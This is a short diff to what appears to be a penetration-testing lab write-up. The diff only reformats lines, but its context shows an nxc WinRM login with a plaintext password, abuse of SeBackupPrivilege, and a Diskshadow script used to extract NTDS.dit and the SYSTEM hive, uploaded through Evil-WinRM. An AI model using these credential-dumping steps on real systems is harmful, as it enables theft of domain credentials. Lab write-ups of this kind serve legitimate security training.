@@ -81,7 +81,8 @@ nxc winrm 10.10.126.10 -u caroline.robinson -p "Password123" -X "whoami /priv"
 The SeBackupPrivilege was identified, enabling access to sensitive files.
 A shadow copy was created using Diskshadow, and the NTDS.dit and SYSTEM hive were extracted:
 
-    Create a shadow copy:
+Create a shadow copy
+
 raj.dsh contents:
 ```
 set context persistent nowriters
@@ -95,6 +96,7 @@ unix2dos raj.dsh
 ```
 
 Upload and execute commands via Evil-WinRM:
+
 ```
 cd C:\Temp
 upload raj.dsh
